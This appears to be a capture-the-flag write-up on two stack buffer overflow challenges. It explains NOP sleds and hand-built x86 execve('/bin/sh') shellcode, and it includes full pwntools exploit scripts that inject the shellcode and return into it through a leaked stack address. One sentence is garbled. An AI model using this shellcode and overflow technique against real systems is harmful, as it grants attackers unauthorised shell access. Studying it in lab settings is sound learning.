# 4_im_lost/4_im_lost_again

Analysis of `4_im_lost` reveals a `gets` so this is an obvious buffer overflow challenge.\
From previous challenges, we saw that there was a win function which we would return into because it had a `system("/bin/sh")` call.

With further analysis, we can not find such a fulike we'd go out nction. So what do we do?

We return into some instruction which does the same as calling `execve("/bin/sh")`, but how?\
We return into what is called a NOP sled, NOP being the opcode `0x90` which means 'no operation' or nop for short.\
A NOP sled is a long string of `nop`s, although we can return into the start of our shellcode, it isn't always the best solution as there may be some issues with alignment or issues being precise.\
Shellcode is code, which in our case is written in hex, and when executed can run anything we want like `system("/bin/sh")`.

Luckily for us, `pwntools` has a function which converts x86 assembly code to its corresponding opcodes.\
The shellcode will be executed once returned into.\
So we have to find a buffer that we control, insert the shellcode into said buffer, and return into it or into the section that we control, typically inside or outside the buffer if the shellcode won't fit inside.

Scenario 1: Buffer fits shellcode

| buffer                          | retn addr      |
| ------------------------------- | -------------- |
| \x90\x90...shellcode...\x90\x90 | addr of buffer |

Scenario 2: Buffer is too small for the shellcode

| buffer    | retn addr             | memory after retn addr          |
| --------- | --------------------- | ------------------------------- |
| AAA...AAA | Address after the esp | \x90\x90...shellcode...\x90\x90 |

Note that the `\x90` paddings are optional, it just helps us in the case where the memory leak we get or calculate doesn't bring us to where we exactly want.

As for the shellcode, we look at https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit for references to the syscalls (x86 asm) we'll be using, in our case execve would be a nice system call to use as we can execve a /bin/sh session.

1. Zero out the eax register
2. Push a 0 into the stack by pushing eax, this is to "clear" the `esp` register
3. Push `hs//` then push `nib/`, pushing them in little endian form will make them come out as `/bin//sh` in `esp`
4. Move the pushed `/bin//sh` into the `ebx` register as that is what will be taken as the argument
5. According to the docs linked above, `ebx`, `ecx`, and `edx` are used as the arguments for the syscall, but we're only interested in `ebx` being `/bin//sh`, so let's clear `ecx` and `edx`.
6. Finally, give `eax` the number that corresponds to the syscall `execve` and invoke the syscall by running `int 0x80`.

Once you have crafted the `execve` payload, you can incorporate that into your NOP sled accordingly as described by the two scenarios above.

<details>
  <summary>My Solutions</summary>

```python
# 4_im_lost
from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./4_im_lost"

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("live at ")
stack_leak = int(p.recvline()[:-1], 16)
log.info(hex(stack_leak))

shellcode = asm('''
xor eax, eax
push eax

push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov edx, ecx

mov eax, 0xb
int 0x80
''')

payload = b"A" * 20 + pack(stack_leak + 25) + b"\x90"*100 + shellcode
p.sendlineafter("/No", payload)

p.interactive()
```

```python
# 4_im_lost_again
from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./4_im_lost_again"

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("live at ")
stack_leak = int(p.recvline()[:-1], 16)
log.info(hex(stack_leak))

shellcode = asm('''
xor eax, eax
push eax

push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov edx, ecx

mov eax, 0xb
int 0x80
''')

log.info(str(len(shellcode)))

payload = b"\x90" * 200 + shellcode + b"\x90" * 190 + pack(stack_leak)
pause()
p.sendlineafter("/No", payload)

p.interactive()
```

</details>
